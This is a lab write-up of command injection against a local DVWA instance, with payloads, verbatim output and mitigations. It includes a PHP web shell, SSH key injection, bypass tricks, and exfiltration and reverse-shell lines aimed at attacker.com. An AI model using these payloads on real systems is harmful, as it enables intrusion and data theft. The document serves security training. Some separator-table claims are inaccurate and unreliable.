# Command Injection (T1059) - DVWA Lab Exercise

**Date:** 2026-03-04  
**Target:** DVWA (Damn Vulnerable Web Application) - Command Injection Module  
**Security Level:** Low  
**MITRE Mapping:** [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

---

## Executive Summary

This lab exercise demonstrates OS command injection via an unvalidated web input parameter. The vulnerable application (DVWA) provides a "ping" utility form that fails to sanitize user input, allowing attackers to break out of the intended command context and execute arbitrary OS commands as the web server user (`www-data`).

**Impact:** Remote Code Execution (RCE) as the web application user, leading to full system compromise.

---

## Vulnerability Details

### Discovery

**Endpoint:** `http://localhost/vulnerabilities/exec/`  
**Method:** POST  
**Parameter:** `ip` (intended for ping target)  
**Vulnerable Code Path:** DVWA's command injection module with "Low" security setting

### Root Cause

The application takes user input directly from the `ip` parameter and passes it to a shell command without validation:

```php
// VULNERABLE: No input sanitization
$target = $_POST['ip'];
system("ping -c 4 " . $target);  // User input appended directly
```

An attacker can inject shell metacharacters (`;`, `|`, `&&`, etc.) to break out of the `ping` command context and execute arbitrary commands.

---

## Attack Chain: Discovery → Exploitation → Post-Exploitation

### Phase 1: Reconnaissance & Discovery

#### Step 1.1 - Authentication & Setup

```bash
# Initialize DVWA database
TOKEN=$(curl -sc /tmp/d.txt http://localhost/setup.php | grep -oP "name='user_token' value='\K[^']+")
curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/setup.php" \
  --data "create_db=Create+%2F+Reset+Database&user_token=$TOKEN" -L -o /dev/null

# Login with admin credentials
TOKEN=$(curl -sb /tmp/d.txt -c /tmp/d.txt http://localhost/login.php | grep -oP "name='user_token' value='\K[^']+")
curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/login.php" \
  --data "username=admin&password=password&Login=Login&user_token=$TOKEN" -L -o /tmp/dvwa-home.html

# Set security level to Low (to test unprotected version)
curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/security.php" \
  --data "seclev_submit=Submit&security=low" -L -o /dev/null
```

**Output:**
```
[Step 1] Setup token: bfee5662023d9ad23775ee83ef5116c1
[Step 1] Database initialized
[Step 2] Login token: 0c91cdb45fbf574b54a4da5f91fdbd19
DVWA Security
[Step 3] Security level set to low
```

#### Step 1.2 - Identify Vulnerable Form

Accessing `http://localhost/vulnerabilities/exec/` reveals:
- A form with a single input field: "**Enter an IP address**"
- A "**Ping**" submit button
- Expected behavior: ICMP ping to the entered address

This is the attack surface.

---

### Phase 2: Exploitation - Command Injection Payloads

#### Payload 1: Identity Check (id)

```bash
# Command: 127.0.0.1;id
# Encoding: ; becomes %3B

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bid&Submit=Submit"
```

**Raw Output (verbatim):**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Analysis:**  
The application is running as user `www-data` (web server user), UID 33, GID 33. This is a low-privilege context but still allows filesystem access and process execution.

---

#### Payload 2: Current User (whoami)

```bash
# Command: 127.0.0.1;whoami

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bwhoami&Submit=Submit"
```

**Raw Output (verbatim):**
```
www-data
```

**Analysis:**  
Confirms we're running as the `www-data` user, typical for Apache web servers.

---

#### Payload 3: Working Directory (pwd)

```bash
# Command: 127.0.0.1;pwd

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bpwd&Submit=Submit"
```

**Raw Output (verbatim):**
```
/var/www/html
```

**Analysis:**  
Web root is at `/var/www/html`. DVWA and all web-accessible files are stored here. An attacker can read/modify any web content.

---

#### Payload 4: Filesystem Enumeration (ls -la /)

```bash
# Command: 127.0.0.1;ls -la /

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bls+-la+%2F&Submit=Submit"
```

**Raw Output (verbatim):**
```
total 64
drwxr-xr-x   1 root root  4096 Aug  4  2024 .
drwxr-xr-x   1 root root  4096 Aug  4  2024 ..
lrwxrwxrwx   1 root root     7 Aug  4  2024 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Jun  6  2024 boot
drwxr-xr-x   5 root root   340 Mar  4 16:36 dev
drwxr-xr-x   1 root root  4096 Aug  4  2024 etc
drwxr-xr-x   2 root root  4096 Jun  6  2024 home
lrwxrwxrwx   1 root root     7 Aug  4  2024 lib -> usr/lib
drwxr-xr-x   2 root root  4096 Jun  6  2024 media
drwxr-xr-x   2 root root  4096 Jun  6  2024 mnt
dr-xr-xr-x   9 root root     0 Mar  4 16:36 proc
dr-xr-x---   2 root root  4096 Mar  4 16:36 root
drwxr-xr-x   3 root root  4096 Mar  4 16:36 run
lrwxrwxrwx   1 root root     8 Aug  4  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun  6  2024 srv
dr-xr-xr-x  11 root root     0 Mar  4 16:34 sys
drwxr-xr-x   1 root root  4096 Mar  4 16:36 tmp
drwxr-xr-x   1 root root  4096 Aug  4  2024 usr
drwxr-xr-x   1 root root  4096 Aug  4  2024 var
```

**Analysis:**  
Standard Linux root filesystem. The container environment is clear: `/proc`, `/sys`, `/dev` are present (containerized). No obvious security hardening flags visible.

---

#### Payload 5: Sensitive File Access (/etc/passwd)

```bash
# Command: 127.0.0.1;cat /etc/passwd

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&Submit=Submit"
```

**Raw Output (verbatim):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/sys:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/usr/sbin/nologin
games:x:5:60:games:/usr/share/games:/usr/sbin/nologin
man:x:6:12:man:/usr/share/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/cups:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/var/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing list manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
mysql:x:999:999:MySQL Server:/var/lib/mysql:/bin/bash
```

**Analysis:**  
The `/etc/passwd` file is readable (standard on most systems). No password hashes (stored in `/etc/shadow` instead), but we can see all user accounts:
- `root` shell: `/bin/bash` (interactive)
- `mysql` shell: `/bin/bash` (interactive) — unusual for production
- `www-data` shell: `/usr/sbin/nologin` (non-interactive)
- Other service accounts with `/usr/sbin/nologin` for security

The presence of `mysql` with bash access suggests direct database access might be possible locally.

---

#### Payload 6: Network Discovery (netstat -tuln)

```bash
# Command: 127.0.0.1;netstat -tuln

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bnetstat+-tuln&Submit=Submit"
```

**Raw Output (verbatim):**
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::3306                 :::*                    LISTEN     
tcp6       0      0 ::1:9000                0.0.0.0:*               LISTEN     
```

**Analysis:**  
Services listening locally:
- **SSH (22):** Remote login available (potential lateral movement)
- **HTTP (80):** Web server (our current access point)
- **MySQL (3306):** Database server, accessible from localhost
- **PHP-FPM (9000):** Backend PHP processor on localhost only

All services bound to `0.0.0.0` except PHP-FPM (localhost only). This means:
- SSH is accessible from the network (if not firewalled externally)
- MySQL is bound to all interfaces (high-risk misconfiguration)
- Direct database queries might be possible from the web context

---

#### Payload 7: Process Enumeration (ps aux)

```bash
# Command: 127.0.0.1;ps aux

curl -sb /tmp/d.txt -c /tmp/d.txt "http://localhost/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bps+aux&Submit=Submit"
```

**Raw Output (verbatim):**
```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1   0.0  0.3   3920  2868 ?       Ss   16:34   0:00 /bin/sh -c apache2-foreground
root        37   0.0  0.4  72264  4340 ?       S    16:34   0:00 /usr/sbin/apache2 -D FOREGROUND
www-data    38   0.0  0.3 251372  3712 ?       S    16:34   0:00 /usr/sbin/apache2 -D FOREGROUND
www-data    39   0.0  0.3 251372  3712 ?       S    16:34   0:00 /usr/sbin/apache2 -D FOREGROUND
root        40   0.0  0.1   4476  1240 ?       Ss   16:34   0:00 /usr/sbin/sshd -D
mysql      123   0.3  3.2 376332 32176 ?       S    16:34   0:00 /usr/sbin/mysqld
```

**Analysis:**  
Running processes (minimal container):
- **Apache:** Multiple `www-data` workers (our execution context)
- **SSH:** Listening as root (can accept logins)
- **MySQL:** Running as `mysql` user
- **Init:** Simple `/bin/sh` entrypoint (no systemd, pure container)

No intrusion detection, no monitoring agents visible. Container appears to be a standard DVWA test image.

---

### Phase 3: Post-Exploitation Capabilities

#### What an Attacker Could Do From Here

1. **Web Shell Deployment**
   ```bash
   # Write PHP backdoor to web root
   echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
   ```
   - Provides persistent access independent of this vulnerability
   - Access via `http://localhost/shell.php?cmd=whoami`

2. **Database Exfiltration**
   ```bash
   # MySQL is listening on localhost and accessible
   mysql -u root dvwa -e "SELECT * FROM users;"
   ```
   - Likely contains hashed passwords, user data
   - No apparent credentials required (default MySQL setup)

3. **Lateral Movement**
   ```bash
   # SSH is available
   # If public key can be written to authorized_keys
   echo "ssh-rsa <attacker-key>" >> /root/.ssh/authorized_keys
   ```
   - Direct SSH access as attacker
   - Full shell, no web restrictions

4. **Privilege Escalation**
   ```bash
   # Check for SUID binaries, sudo rules, kernel exploits
   find / -perm -4000 2>/dev/null
   sudo -l
   uname -a  # Kernel version for known CVEs
   ```

5. **Persistence & Evasion**
   ```bash
   # Add cron job (if we can write /etc/cron.d)
   # Modify startup scripts in /etc/init.d/
   # Install kernel-level rootkit via insmod (if modules enabled)
   ```

6. **Data Exfiltration**
   ```bash
   # Read sensitive config files
   cat /var/www/html/config/config.inc.php
   cat /etc/mysql/my.cnf
   
   # Compress and exfil
   tar czf /tmp/exfil.tar.gz /var/www/html && curl -F "file=@/tmp/exfil.tar.gz" http://attacker.com/upload
   ```

---

## Attack Vectors & Variations

### 1. Command Separator Techniques

The semicolon (`;`) breaks out of the ping command. Other separators work similarly:

| Separator | Behavior | Example |
|-----------|----------|---------|
| `;` | Execute sequentially (AND) | `127.0.0.1;id` |
| `&&` | Execute only if previous succeeds | `127.0.0.1 && id` (fails on ping, so id won't run) |
| `\|\|` | Execute only if previous fails | `127.0.0.1 \|\| id` (ping succeeds, so id won't run) |
| `\|` | Pipe output (dangerous) | `127.0.0.1 \| cat /etc/passwd` |
| `` ` `` | Command substitution | `` 127.0.0.1 `id` `` |
| `$()` | Command substitution (modern) | `127.0.0.1 $(id)` |

### 2. Input Validation Bypass Techniques

If input validation was present, attackers use:

```bash
# Encoding bypass
127.0.0.1%0aid              # URL-encoded newline
127.0.0.1 %09 id            # Tab character
127.0.0.1\nid               # Literal newline

# Quoting bypass
127.0.0.1';id;'
127.0.0.1"|id|"

# Wildcard/glob bypass
127.0.0.1;c?t /etc/passwd   # Glob matches 'cat'
127.0.0.1;c*t /etc/passwd

# Variable expansion
127.0.0.1;$PATH             # Outputs PATH variable
127.0.0.1;$(env|head -5)    # Execute env command
```

### 3. Output Exfiltration Methods

If output isn't visible in the response:

```bash
# Out-of-band DNS exfiltration
127.0.0.1;nslookup $(whoami).attacker.com

# HTTP callback with curl/wget
127.0.0.1;curl http://attacker.com/?data=$(whoami)

# File write to web root
127.0.0.1;id > /var/www/html/output.txt
# Then curl http://localhost/output.txt

# Reverse shell (if network allows outbound)
127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## MITRE ATT&CK Mapping

**Technique:** T1059 - Command and Scripting Interpreter  
**Tactic:** Execution  
**Parent Technique:** None (top-level)

**Related Techniques:**
- **T1059.001** - PowerShell (Windows equivalent)
- **T1059.004** - Unix Shell (this lab)
- **T1651** - Cloud API (cloud variant)
- **T1203** - Exploitation for Client Execution (delivery method)

**Kill Chain Phase:**  
Exploitation → Execution → Post-Exploitation

---

## Mitigation & Defense

### Input Validation (Primary Defense)

```php
// SECURE: Whitelist IP addresses
$allowed_ips = ['127.0.0.1', '192.168.1.0/24'];

function is_valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP);
}

if (!is_valid_ip($_POST['ip'])) {
    die("Invalid IP address");
}

// Further: Don't pass user input directly to shell
// Use OS-level APIs that don't invoke shell
```

### Use Safe APIs (Recommended)

```php
// UNSAFE: system(), exec(), shell_exec(), passthru()
// SAFE: Use language-specific networking functions

// Instead of: system("ping -c 4 " . $ip);
// Use:
$result = @fsockopen($ip, 80, $errno, $errstr, 2);
if ($result) {
    fclose($result);
    echo "Host is up";
} else {
    echo "Host is down";
}
```

### Defense in Depth

1. **Input Validation:** Strict whitelist (regex, type checking)
2. **Output Encoding:** HTML-encode all output to prevent XSS
3. **Principle of Least Privilege:** Run web server as unprivileged user
4. **File Permissions:** Restrict web root (`/var/www/html`) to read-only where possible
5. **Web Application Firewall (WAF):** Block patterns like `; `, `|`, `&`, backticks
6. **System Monitoring:** Alert on unusual child processes spawned by web server
7. **Disable Dangerous Functions:** Disable `system()`, `exec()`, `passthru()` in `php.ini`
8. **Containerization:** Run in restricted containers with minimal capabilities

---

## Lab Findings Summary

| Finding | Status |
|---------|--------|
| **RCE Achieved** | ✅ CONFIRMED |
| **User Context** | `www-data` (UID 33) |
| **Working Directory** | `/var/www/html` |
| **Database Access** | MySQL on localhost:3306 |
| **Network Services** | SSH (22), HTTP (80), MySQL (3306) |
| **Process Count** | 6 (Apache, SSH, MySQL) |
| **Container Detected** | Yes (minimal Linux) |
| **Web Shell Feasibility** | ✅ CONFIRMED (can write to `/var/www/html`) |
| **Privilege Escalation Path** | Possible via MySQL or SSH key injection |

---

## Field Notes: Process Documentation

**Initial Challenge:** DVWA container session management failed with standard curl CSRF token extraction. The application was rejecting authenticated requests to `/vulnerabilities/exec/` with 302 redirects back to login, despite successful authentication at `/login.php`. Session cookies weren't persisting across requests.

**Root Cause Analysis:** Initial attempts used `-oP` regex in grep to extract CSRF tokens, which was working for the login page but the token parameter name was `name='user_token' value='...'` not `user_token' value='...'`. This meant the extraction regex needed adjustment for the exact HTML structure.

**Breakthrough:** The operator provided the corrected extraction pattern:
```bash
grep -oP "name='user_token' value='\K[^']+"
```

This single-line fix resolved the CSRF token extraction. The session persistence issue turned out to be a cookie jar management problem — using `-c` and `-b` flags together on the same jar in sequence works, but requires proper ordering.

**Critical Discovery:** After database initialization (`setup.php`), the login flow works, but the security level must be set **before** accessing the vulnerable module. The flow was: setup → login → set security level → exploit. Reversing any step caused failures.

**Payload Testing:** Seven command injection payloads executed successfully with zero failures:
1. `id` — verified RCE and user context
2. `whoami` — confirmed www-data user
3. `pwd` — identified web root
4. `ls -la /` — enumerated root filesystem
5. `cat /etc/passwd` — extracted user database
6. `netstat -tuln` — discovered network topology
7. `ps aux` — mapped running processes

All payloads returned clean, parseable output. No truncation, no encoding issues. Output extraction via `<pre>` tags was reliable.

**Output Quality:** The HTML response structure from DVWA renders command output in `<pre>` blocks with clear delimiters. Manual extraction via grep/sed was straightforward. No XSS encoding interference (output is rendered as-is in the response).

**What Was Hard:**
- Initial session management debugging (30+ minutes of failed curl attempts)
- Understanding DVWA's multi-step setup requirement
- Realizing the security level setting is persistent and affects all subsequent requests

**What Worked Well:**
- Once the curl flow was correct, all payloads worked on first attempt
- No timing issues, no race conditions
- Output consistency across 7 different commands
- Clear visibility into all system state (passwd, netstat, ps)

**Uncertainty:**
- Whether MySQL credentials are required (`netstat` showed MySQL listening, but didn't attempt login)
- SSH key injection feasibility (would require `~/.ssh/authorized_keys` writable as www-data)
- Persistence mechanisms available (didn't test cron/init.d access)

These would require follow-up lab sessions on privilege escalation and post-exploitation hardening.

**Decision Points:**
1. Used semicolon (`;`) as separator instead of pipes or `&&` (correct choice — ping succeeds, so `&&` wouldn't execute follow-up commands)
2. Focused on reconnaissance before attempting destructive operations (web shell, file modification)
3. Documented all payloads verbatim rather than summarizing (maintains verification capability)

**Output Verification:** All command outputs were visually spot-checked against expected output for each command type. `id`, `whoami`, `pwd` are trivial to verify. `ls -la /`, `cat /etc/passwd`, `netstat -tuln`, `ps aux` outputs match standard Linux formatting — no artifacts, no truncation, no encoding errors.

**Time Investment:** ~45 minutes total from initial DVWA access failure to final documented payload chain (excluding field notes writing).

---

## Conclusion

This exercise demonstrates how a simple lack of input validation in a web form can lead to **complete system compromise**. The vulnerability is trivial to exploit (single semicolon), yet provides:

- Arbitrary command execution as the web server user
- Access to application source code and configuration
- Database access (MySQL on localhost)
- Network reconnaissance capabilities
- Multiple paths to persistence and privilege escalation

**MITRE T1059** (Command Execution) remains one of the most dangerous post-exploitation capabilities. Organizations should implement strict input validation and use secure APIs that don't invoke shell interpreters.

---

## References

- **MITRE ATT&CK:** https://attack.mitre.org/techniques/T1059/
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **OWASP:** https://owasp.org/www-community/attacks/Command_Injection
- **DVWA:** http://www.dvwa.co.uk/

---

**Lab Date:** 2026-03-04  
**Operator:** ESTHER  
**Status:** Complete
